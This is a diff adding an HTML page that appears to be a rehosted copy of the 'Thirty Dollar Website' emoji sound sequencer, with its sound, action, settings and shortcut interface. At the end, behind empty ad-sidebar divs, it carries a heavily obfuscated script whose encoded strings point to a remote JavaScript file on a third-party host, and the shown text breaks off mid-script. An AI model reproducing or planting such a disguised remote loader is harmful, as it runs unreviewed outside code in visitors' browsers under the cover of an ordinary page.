@@ -1,0 +1,458 @@
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script><!doctype html>
+<html>
+    <head>
+        <base href="https://cdn.jsdelivr.net/gh/freebuisness/assets@main/352/">
+        <title>DON'T YOU LECTURE ME WITH YOUR THIRTY DOLLAR WEBSITE</title>
+        <link rel="stylesheet" href="🎨.css?v=8a" charset="UTF-8">
+        <link rel="icon" href="assets/🗿.png">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=820">
+        <meta property="og:title" content="DON'T YOU LECTURE ME WITH YOUR THIRTY DOLLAR WEBSITE">
+        <meta property="og:description" content="🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿">
+        <meta property="og:type" content="website">
+        <meta name="og:image" itemprop="image" content="assets/🗿.png">
+
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-7YF7WH8ESJ"></script>
+        <script>window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-7YF7WH8ESJ');</script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js"></script>
+    <style>
+#sidebarad1,
+#sidebarad2 {
+  position: fixed;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 160px;
+  height: 600px;
+  padding: 0;
+  margin: 0;
+  z-index: 999999;
+}
+#sidebarad1 {
+  left: 0;
+}
+#sidebarad2 {
+  right: 0;
+}
+.sidebar-close {
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 22px;
+  height: 22px;
+  line-height: 22px;
+  text-align: center;
+  background: rgba(0,0,0,0.7);
+  color: #fff;
+  font-size: 14px;
+  cursor: pointer;
+  user-select: none;
+  z-index: 10;
+}
+.sidebar-frame {
+  width: 160px;
+  height: 600px;
+  border: none;
+  display: block;
+}
+</style>
+</head>
+
+    <body style="text-align: center">
+
+        <div id="everything">
+        
+        <h1 class="title" id="caption">DON'T YOU LECTURE ME WITH YOUR THIRTY DOLLAR WEBSITE</h1>
+
+        <div id="main">
+
+            <div class="sideboxes">
+                <div class="innersidebox" id="icons_container">
+                    <div class="infobox">
+                        <h1 id="soundText">Sounds</h1>
+                        <h1 id="soundInfo" style="display: none; color: var(--greenfont); white-space: nowrap;">
+                            <soundinfo id="soundName"></soundinfo>
+                            <soundinfo id="soundOrigin" style="margin-left: 5px; font-size: 20px; opacity: 50%;"></soundinfo>
+                        </h1>
+                        <span><p mobile="Tap to add sound">Left click to add sound</p><p mobile="Hold to preview">Right click to preview</p></span>
+                    </div>
+                    <div class="iconbox loadingIcons" id="icons" style="height: 467px">
+                        <div id="iconboxLoading" style="width: 100%; opacity: 33%">
+                            <h1 id="loadingText">Loading...</h1>
+                            <p id="errorInfo" style="font-weight: normal; padding-bottom: 10px"><p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="innersidebox" style="width: 284px;">
+                    <div class="infobox">
+                        <h1 id="actionText">Actions</h1>
+                        <h1 id="actionInfo" style="display: none; color: var(--bluefont)">
+                            <actioninfo id="actionName"></actioninfo>
+                            <actioninfo id="actionKey" style="margin-left: 5px; font-size: 20px; opacity: 50%;"></actioninfo>
+                        </h1>
+                        <span class="mobileOnly"><p mobile="Tap to add action">Left click to add action</p></span>
+                    </div>
+                    <div class="iconbox" id="actions"></div>
+
+                    <div class="playbuttons">
+                        <p id="bpmInfo" class="stopInfo" style="display: none;"><span id="BPM"></span> BPM &nbsp;&nbsp;•&nbsp;&nbsp; <span id="volume"></span>% Volume</p>
+                        <div id="stopBtn" class="stopInfo" style="background-color: var(--emojiyellow); display: none;" onclick="cancel({ stopSounds: true })" oncontextmenu="return false">
+                            <img src="assets/stop.png">
+                            <h1>Stop</h1>
+                        </div>
+
+                        <p class="playInfo" mobile="Hold to skip intro">Right click to skip intro</p>
+                        <div id="playBtn" class="playInfo" style="background-color: var(--emojigreen)" onclick="startSequence()" oncontextmenu="startSequence(true); return false">
+                            <img src="assets/play.png">
+                            <h1>Play</h1>
+                        </div>
+
+                        <div id="resetBtn" style="background-color: var(--emojired)" onclick="if (!active && $('#sequence').children().length) { shiftHeld ? $('#clearsounds').click() : $('#clearAll').css('display', 'flex') }" oncontextmenu="return false">
+                            <img src="assets/reset.png">
+                            <h1>Clear</h1>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 0px">
+                <div class="infobox">
+                    <h1>Sequence</h1>
+                    <span>
+                        <p mobile="Tap to remove">Left click to remove</p>
+                        <p class="nomobile">Right click to preview</p>
+                        <p class="nomobile">Shift click to clone</p>
+                        <p mobile="Swipe to change pitch">Scroll to change pitch</p>
+                        <p class="nomobile">Ctrl+scroll to change volume</p>
+                        <!-- <p mobile="Drag to rearrange">Drag to rearrange</p> -->
+                    </span>
+                </div>
+                <div class="iconbox" id="sequence"></div>
+            </div>
+
+            <div style="display: none;" id="sectionSettings">
+                <div class="infobox" style="flex-direction:column; align-items: flex-start">
+                    <h1 style="margin-bottom: 12px" class="noPin">Selected section: <b id="selectedSection">None</b></h1>
+                    <div class="sectionControls">
+                        <img onclick="changeSection(-1)" class="imgButton" src="assets/section_previous.png" title="Previous section">
+                        <img onclick="changeSection(1)" class="imgButton" src="assets/section_next.png" title="Next section">
+                        <img class="requiresSelected imgButton cantSelect" id="hideSection" onclick="toggleSectionVisibility()" src="assets/section_hide.png" title="Hide section">
+                        <img class="requiresSelected imgButton cantSelect" id="showSection" onclick="toggleSectionVisibility()" src="assets/section_show.png" title="Show section" style="display: none">
+                        <img class="requiresSelected imgButton cantSelect" onclick="deselectSection()" src="assets/section_deselect.png" id="Deselect section">
+                    </div>
+                    <span class="noPin" style="margin-top: 12px">
+                        <p>Ctrl+Click to select a section</p>
+                        <p>Ctrl+Up/Down to change section</p>
+                        <p>Ctrl+D to deselect</p>
+                    </span>
+                    <p class="noPin multiline" style="text-align: left; margin-top: 0px">Sounds will be added to the end of the selected section, and playback will begin from the beginning of it.<br>You can pin these section controls from the settings.</p>
+                </div>
+            </div>
+
+            <input type="file" id="loadFile" style="display: none;" accept=".🗿,.moai,.txt,">
+
+            <div class="playbuttons saveButtons" id="saveOptions" style="display: none; margin-top: 30px; flex-direction: row; justify-content: center;";>
+
+                <div id="saveBtn" onclick="quickSave()" style="position: relative" oncontextmenu="return false">
+                    <img src="assets/save.svg">
+                    <h1>Save</h1>
+                </div>
+
+                <div id="downloadBtn" oncontextmenu="return false">
+                    <img src="assets/download.svg">
+                    <h1 id="saveAsText">Save As</h1>
+                </div>
+
+                <div id="loadBtn" onclick="$('#loadFile').click()" oncontextmenu="return false">
+                    <img src="assets/load.svg">
+                    <h1>Load</h1>
+                </div>
+
+            </div>
+
+            <div style="display: flex; justify-content: center; align-items: center; margin: 7px 0px 16px 0px;">
+                <input id="saveName" placeholder="sequence" type="text" style="height: 32px; width: 200px; background-color: rgba(0, 0, 0, 0.25);">
+                <p style="margin: 0px 0px 0px 6px; padding: 0px 0px; font-size: 20px;">.🗿</p>
+            </div>
+
+            <div class="socialLinks" style="margin-bottom: 10px; padding-top: 25px">
+                <p style="font-size: 20px; margin: 0px 10px 0px 0px">#thirtydollarwebsite creations on:</p>
+                <div class="socialTag"><a target="_blank" href="https://youtube.com/results?search_query=%23thirtydollarwebsite"><img src="assets/social_youtube.svg"> <p>YouTube</p></a></div>
+                <div class="socialTag"><a target="_blank" href="https://tiktok.com/search?q=%23thirtydollarwebsite"><img src="assets/social_tiktok.svg"> <p>TikTok</p></a></div>
+                <div class="socialTag"><a target="_blank" href="https://twitter.com/search?q=%23thirtydollarwebsite&src=typed_query&f=top"><img src="assets/social_twitter.svg"> <p>Twitter</p></a></div>
+            </div>
+
+            <div>           
+                <!-- <p class="multiline" style="margin-bottom: 16px"> -->
+                    <!-- <b>NEW: </b> 12 new sounds for all your particle accelerator needs</p> -->
+                <p>Check out my other silly projects over at <a style="color: white !important" target="_blank" href="https://gdcolon.com?f=30">gdcolon.com</a></p>
+            </div>
+
+            <div class="credits" style="margin-bottom: 8px">
+                <p>Created by <a target="_blank" href="https://twitter.com/TheRealGDColon">Colon</a> :</p>
+                <p title="no copyright intended">I own pretty much nothing on this site please don't kill me</p>
+            </div>
+
+            <div style="padding: 10px 0px 10px 0px">
+                <button style="width: 150px; background: var(--emojiblue)" onclick="$('#settingsMenu').show()"><b>Settings</b></button>
+                <button class="nomobile" style="margin-left: 20px; width: 150px; background: var(--emojiblue)" onclick="$('#shortcutMenu').show()"><b>Shortcuts</b></button>
+            </div>
+
+            <div style="display: flex; justify-content: center; padding: 10px 0px 30px 0px">
+                <div class="extraSetting">
+                    <input class="settingBox" id="toggleProMode" type="checkbox" setting="proMode">
+                    <p style="font-weight: bold; font-size: 20px">PRO MODE</p>
+                </div>
+            </div>
+
+            <div id="extraPadding" style="display: none; height: 200px"></div>
+
+        </div>
+
+        <div id="proHotbar" style="display: none">
+            <div class="hotbarTabs">
+                <div class="hotbarTab" tab="all" desc="Sounds">
+                    <img src="assets/tab_all.svg">
+                </div>
+                <div class="hotbarTab" tab="actions" desc="Actions">
+                    <img src="assets/tab_actions.svg">
+                </div>
+                <div class="hotbarTab" tab="recent" desc="Recent">
+                    <img src="assets/tab_recent.svg">
+                </div>
+                <!-- <div class="hotbarTab" tab="favorite" desc="Favorites">
+                    <img src="assets/tab_favorites.svg">
+                </div> -->
+                <div class="hotbarTab" tab="notes" desc="Notes">
+                    <img src="assets/tab_notes.svg">
+                </div>
+                <div class="hotbarTab" tab="percussion" desc="Percussion">
+                    <img src="assets/tab_percussion.svg">
+                </div>
+                <div id="hotbarHovertext" style="display: flex; justify-content: flex-start; align-items: center">
+                    <h1 class="hotbarLabel" id="hotbarText" style="white-space: nowrap;"></h1>
+                    <h1 class="hotbarLabel" id="hotbarContext" style="white-space: nowrap; margin-left: 10px; margin-top: 16px; font-size: 20px; opacity: 50%"></h1>
+                </div>  
+            </div>
+            <div class="hotbar fancyScroll" id="hotbarNotes">
+                
+            </div>
+        </div>
+        
+        <div class="popup" id="action_speed" style="display: none">
+            <div class="popupbox">
+                <h1>Set tempo</h1>
+                <p class="popupdesc">Sets the rate at which sounds are played.<br>Default is 300 sounds per minute.</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <input id="bpmAmount" value="300" type="number"><p> BPM</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAction('speed', '#bpmAmount', 'add')" style="background: var(--emojigreen)">Add</button>
+                    <button onclick="addAction('speed', '#bpmAmount', 'set')" style="font-weight: bold; background: var(--emojiblue)" actionConfirm="true">Set to</button>
+                    <button onclick="addAction('speed', '#bpmAmount', 'multiply')" style="background: var(--emojigreen)">Multiply</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="action_volume" style="display: none">
+            <div class="popupbox">
+                <h1>Set volume</h1>
+                <p class="popupdesc">Sets the volume of all subsequent sounds.<br>Default is 100%, max is 600%.</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <input id="volumeAmount" value="100" type="number"><p>%</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAction('volume', '#volumeAmount', 'add')" style="background: var(--emojigreen)">Add</button>
+                    <button onclick="addAction('volume', '#volumeAmount', 'set')" style="font-weight: bold; background: var(--emojiblue)" actionConfirm="true">Set to</button>
+                    <button onclick="addAction('volume', '#volumeAmount', 'multiply')" style="background: var(--emojigreen)">Multiply</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="action_stop" style="display: none">
+            <div class="popupbox">
+                <h1>Pause</h1>
+                <p class="popupdesc">Pauses for a specified duration.</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <input id="pauseAmount" value="4" type="number"><p> beats</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAction('stop', '#pauseAmount')" style="font-weight: bold; background: var(--emojiblue)" actionConfirm="true">OK</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="popup" id="action_loopmany" style="display: none">
+            <div class="popupbox">
+                <h1>Loop</h1>
+                <p class="popupdesc">Loop for a specified number of times.<br>Returns to the start if no start point (◇) is set</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <input id="loopAmount" value="4" type="number"><p> loops</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAction('loopmany', '#loopAmount')" style="font-weight: bold; background: var(--emojiblue)" actionConfirm="true">OK</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="action_transpose" style="display: none">
+            <div class="popupbox">
+                <h1>Transpose</h1>
+                <p class="popupdesc">Increases or decreases the pitch of all subsequent sounds.</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <input id="transposeAmount" value="1" type="number"><p> semitones</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAction('transpose', '#transposeAmount', 'set')" style="font-weight: bold; background: var(--emojiblue)" actionConfirm="true">Set to</button>
+                    <button onclick="addAction('transpose', '#transposeAmount', 'add')" style="background: var(--emojigreen)">Add</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="action_pulse" style="display: none">
+            <div class="popupbox">
+                <h1>Pulse</h1>
+                <p class="popupdesc">Pulses the screen a certain amount of times.<br>Only one pulse action can be active at a time.<br>Ignores tempo changes.</p>
+                <p class="skippableAction"></p>
+                <div class="popupinput"> <p style="width: 100px; text-align: right; margin-right: 15px">Pulses:</p> <input id="pulseAmount" value="1" type="number"> <p>(total amount)</p> </div>
+                <div class="popupinput"> <p style="width: 100px; text-align: right; margin-right: 15px">Frequency:</p> <input id="pulseInterval" value="2" type="number"> <p>(every X beats)</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="addAdvancedAction('pulse', [$('#pulseAmount').val(), $('#pulseInterval').val()])" style="background: var(--emojigreen)" actionConfirm="true">Add</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="action_bg" style="display: none">
+            <div class="popupbox">
+                <h1>Background Color</h1>
+                <p class="popupdesc">Sets the page's background color.</p>
+                <div class="popupinput">
+                    <p style="margin-right: 6px">#</p>
+                    <input style="width: 90px; text-transform: uppercase;" class="colorTextbox" maxlength="6" colorgroup="bgColor" value="36393c">
+                    <div class="colorPreview" colorgroup="bgColor" style="background-color: #36393c"></div>
+                    <input type="color" id="bgColor" class="colorSelector" colorgroup="bgColor" value="#36393c">
+                </div>
+                <div class="popupinput"> <p style="width: 100px; text-align: right; margin-right: 15px">Fade time:</p> <input id="bgFadetime" value="0.5" type="number"> <p>secs</p> </div>
+                <div style="margin-top: 25px">
+                    <button onclick="$('#bgColor').val(defaultBG).trigger('input')" style="background: var(--emojired)">Reset</button>
+                    <button onclick="addAdvancedAction('bg', [$('#bgColor').val(), $('#bgFadetime').val()])" style="background: var(--emojigreen)" actionConfirm="true">Add</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="clearAll" style="display: none">
+            <div class="popupbox">
+                <h1>Clear all sounds?</h1>
+                <p class="popupdesc">Surprisingly, this can't be undone.<span class="nomobile"><br>(hold shift to skip this popup)</span></p>
+                <div style="margin-top: 25px">
+                    <button onclick="$('.popup').hide()" style="width: 120px; font-weight: bold; background: #777777; margin-right: 12px">Back</button>
+                    <button id="clearsounds" style="width: 120px; font-weight: bold; background: var(--emojired)">Clear!</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="settingsMenu" style="display: none">
+            <div class="popupbox">
+                <h1>Settings</h1>
+                <p id="settingHelp" style="height: 36px; opacity: 50%" mobile="(tap on a setting for information)">(hover over a setting for information)</p>
+                <p id="settingInfo" style="height: 36px; display: none; padding: 0px 30px"></p>
+                <div class="settingList">
+                    <div class="extraSetting nomobile" title="Enables placing actions using single-key shortcuts"><input class="settingBox" inverted="true" type="checkbox" setting="noActionShortcuts"><p>Action shortcuts</p></div>
+                    <div class="extraSetting" title="Disables most animations on the page (bouncing, pulsing, flashing, etc). Enable if playback is lagging"><input class="settingBox" type="checkbox" setting="noAnimations"><p>Disable Animations</p></div>
+                    <div class="extraSetting" title="Automatically scrolls the screen during playback"><input class="settingBox" type="checkbox" setting="autoScroll"><p>Auto-scroll</p></div>
+                    <div class="extraSetting" title="Pins the section buttons to the bottom of the screen"><input class="settingBox" type="checkbox" setting="pinSectionButtons"><p>Pin section controls</p></div>
+                    <div class="extraSetting" title="Attemps to display a warning message when exiting the page without saving"><input class="settingBox" type="checkbox" setting="exitConfirmation"><p>Exit confirmation</p></div>
+                    <div class="extraSetting requiresNewSaving" style="display: none" title="Reverts to the older saving system where pressing save simply downloads the file"><input class="settingBox" type="checkbox" setting="oldSaving"><p>Old save system</p></div>
+                    <div class="extraSetting" title="Uses the .moai file extension when saving, instead of .🗿"><input class="settingBox" type="checkbox" setting="altExtension"><p>Alt file extension</p></div>
+                </div>
+                <div style="margin-top: 25px">
+                    <button style="background: var(--emojiblue)" onclick="$('.popup').hide()">Done</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="popup" id="shortcutMenu" style="display: none">
+            <div class="popupbox" style="width: 800px; overflow: auto;">
+                <h1 style="margin-bottom: 25px">Keyboard Shortcuts</h1>
+                <div class="shortcutList fancyScroll">
+                    <div class="shortcutSection">
+                        <p class="groupName"><b>Sound list</b></p>
+                        <p><b>Left click:</b> Place sound</p>
+                        <p><b>Shift + left click:</b> Place sound at start</p>
+                        <p><b>Right click:</b> Preview sound</p>
+                    </div>
+
+                    <div class="shortcutSection">
+                        <p class="groupName"><b>Action list</b></p>
+                        <p><b>Left click:</b> Place action</p>
+                        <p><b>Right click:</b> Edit action</p>
+                        <p><b>Shift + left click:</b> Place action at start</p>
+                        <p><b>Right click:</b> Place action, skip popups</p>
+                    </div>
+
+                    <div class="shortcutSection">
+                        <p class="groupName"><b>Sequence</b></p>
+                        <p><b>Left click:</b> Remove icon</p>
+                        <p><b>Right click:</b> Preview sound</p>
+                        <p><b>Drag:</b> Move icon</p>
+
+                        <p><b>Shift + left click:</b> Duplicate (directly after)</p>
+                        <p><b>Shift (or alt) + right click:</b> Duplicate (end of sequence)</p>
+                        <p><b>Shift + drag:</b> Duplicate to position</p>
+
+                        <p><b>Scroll:</b> Adjust pitch or action</p>
+                        <p><b>Ctrl + scroll:</b> Adjust volume</p>
+                        <p><b>Shift + scroll:</b> Larger adjust</p>
+                        <p><b>Alt + scroll:</b> Smaller adjust</p>
+                        <p><b>Up/down:</b> Same as scrolling</p>
+                    </div>
+
+                    <div>
+                        <div class="shortcutSection">
+                            <p class="groupName"><b>Divider sections</b></p>
+                            <p><b>Ctrl + click:</b> Select/deselect section</p>
+                            <p><b>Ctrl + up/down:</b> Next/previous section</p>
+                            <p><b>Ctrl + right click:</b> Show/hide section</p>
+                            <p><b>Ctrl + D:</b> Deselect section</p>
+                        </div>
+    
+                        <div class="shortcutSection" style="margin-top: 40px">
+                            <p class="groupName"><b>Global</b></p>
+                            <p><b>Space/enter:</b> Play/stop</p>
+                            <p><b>Esc:</b> Close popup</p>
+                            <p><b>Ctrl + S:</b> Save</p>
+                            <p><b>Ctrl + Shift + S:</b> Save as</p>
+                            <p><b>Ctrl + Alt + S:</b> View sequence data</p>
+                            <p><b>Ctrl + O:</b> Load</p>
+                            <p><b>Ctrl + P:</b> Toggle pro mode</p>
+                            <p><b>Shift + /:</b> Settings</p>
+                            <p><b>Ctrl + /:</b> Shortcuts</p>
+                        </div>
+                    </div>
+
+                </div>
+                <div style="margin-top: 25px">
+                    <button style="background: var(--emojiblue)" onclick="$('.popup').hide()">Done</button>
+                </div>
+            </div>
+        </div>
+
+        </div>
+
+    <div id="sidebarad1">
+  <div class="sidebar-close" onclick="this.parentElement.style.display='none'">✕</div>
+</div>
+<div id="sidebarad2">
+  <div class="sidebar-close" onclick="this.parentElement.style.display='none'">✕</div>
+</div>
+<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const UTF$MMBycHGYrTfD_Ufh=sFfEkK$fMziBAJZwZbkuvp,vUk$$ZvvSlCIAc=_0xe8c3,aivDrxhk$kGhjNzepqLWPvd=mRvOXTqaCttJOulbTlUWmr();while(!![]){try{const uSUNXbU$YsNm$I=-parseInt(vUk$$ZvvSlCIAc(-parseInt(0x3)*0x7ef+0x3*parseFloat(-parseInt(0x1d9))+parseInt(0x1e2b)*parseInt(0x1)))/(parseFloat(-parseInt(0x13d))+parseFloat(-0x1054)*-0x2+Math.trunc(-0xfb5)*0x2)*(parseInt(vUk$$ZvvSlCIAc(Number(-0x206f)+-0x17f1+parseInt(parseInt(0x3949))))/(-parseInt(0x9b)+-0x2253+-0x8bc*parseInt(-0x4)))+parseInt(vUk$$ZvvSlCIAc(0xf*-parseInt(0x17f)+Math.trunc(0xe59)+0x8f2))/(-0x1*Math.floor(-parseInt(0x48b))+-parseInt(0x3d)*-parseInt(0x3e)+-parseInt(0x134e))*(-parseInt(vUk$$ZvvSlCIAc(Math.trunc(-parseInt(0x596))+0x4*-parseInt(0x6c2)+Math.floor(0x216d)))/(-parseInt(0x142d)*-parseInt(0x1)+0x1230+-parseInt(0x2659)))+parseInt(vUk$$ZvvSlCIAc(parseInt(0xb)*0x25+0x31*-parseInt(0x6d)+-parseInt(0x37)*-0x5e))/(parseInt(0x1588)+-parseInt(0x26c7)+0x1144)*(parseInt(vUk$$ZvvSlCIAc(-parseInt(0x153)+-parseInt(0x996)*parseInt(0x1)+parseInt(0xbc8)*Math.trunc(parseInt(0x1))))/(0x11a*parseInt(0xd)+parseInt(0x15)*-0x16f+0xfcf))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x1))*-parseInt(0x155f)+Math.trunc(-0x19)*Math.ceil(-0x16f)+-0xd8d*Math.floor(parseInt(0x1))))/(Number(-0x13b8)+0x210f+0x18*-0x8e)*(-parseInt(vUk$$ZvvSlCIAc(0x559*Math.floor(0x6)+-0xa*Math.ceil(-parseInt(0x76))+-parseInt(0x23ce)*parseInt(0x1)))/(0x5*parseFloat(-parseInt(0x47b))+-parseInt(0x2e7)*Math.max(0x6,parseInt(0x6))+Math.floor(parseInt(0x65))*0x65))+-parseInt(vUk$$ZvvSlCIAc(parseFloat(-parseInt(0x18ac))*parseFloat(0x1)+-0x1266+Math.max(0x2bf7,parseInt(0x2bf7))))/(-0xfb0+parseFloat(parseInt(0x1fc))*parseFloat(parseInt(0xd))+Math.ceil(-parseInt(0x1))*Number(parseInt(0xa13)))*(parseInt(vUk$$ZvvSlCIAc(Math.floor(-parseInt(0x1))*-0xea3+0x77d*-0x4+Math.ceil(parseInt(0x1041))))/(-parseInt(0x1)*Math.ceil(parseInt(0xc0a))+parseInt(-0x7)*Number(parseInt(0x365))+0x72b*Math.floor(parseInt(0x5))))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x14a9))*Math.max(0x1,0x1)+parseInt(0xf9e)+-parseInt(0x2384)))/(Math.ceil(-parseInt(0x1))*-0x5b3+-0x249+0x35f*Math.ceil(-0x1))*(-parseInt(vUk$$ZvvSlCIAc(Math.max(0x1da8,parseInt(0x1da8))+0x2211+parseInt(-0x157)*parseInt(0x2f)))/(0x1af2+0x6be+Number(-parseInt(0x21a4))))+parseInt(vUk$$ZvvSlCIAc(0x15e9+0x5*Math.ceil(-0x3cb)+parseInt(0x1)*Math.floor(-parseInt(0x215))))/(-0xad*-parseInt(0x35)+-parseInt(0x11c)*parseFloat(parseInt(0x2))+Math.ceil(0x71)*-0x4c);if(uSUNXbU$YsNm$I===C_FoJhGb_hSKAwdyPQonizmLyCA)break;else 